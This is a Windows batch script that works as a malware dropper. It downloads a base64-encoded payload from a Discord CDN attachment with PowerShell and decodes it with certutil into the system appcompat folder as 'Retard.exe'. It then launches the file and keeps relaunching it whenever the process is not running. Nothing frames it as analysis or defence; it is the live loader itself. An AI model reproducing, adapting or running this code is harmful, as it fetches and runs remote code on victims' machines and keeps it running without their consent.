@echo off
cls
set "AvloPath=%SYSTEMROOT%\appcompat\Retard.exe"
set "AvloDir=%SYSTEMROOT%\appcompat"

:SCHECK
if not exist "%AVLOPATH%" (
  goto create
) else (
  goto MAINTAIN
)

:MAINTAIN
if not exist "%AVLOPATH%" goto CREATE
tasklist | find /I "Retard.exe" >nul 2>&1
if "%ERRORLEVEL%"=="1" Start %AVLOPATH%

:CREATE
if not exist "%AVLOPATH%" (
    >nul powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/950495650284462090/963534978216493116/Encoded.txt', '%TEMP%\b64dropA')
    certutil -decode "%TEMP%\b64dropA" "%AVLOPATH%"
    start %AVLOPATH% >nul 2>&1
    goto MAINTAIN
) else (
    goto MAINTAIN
)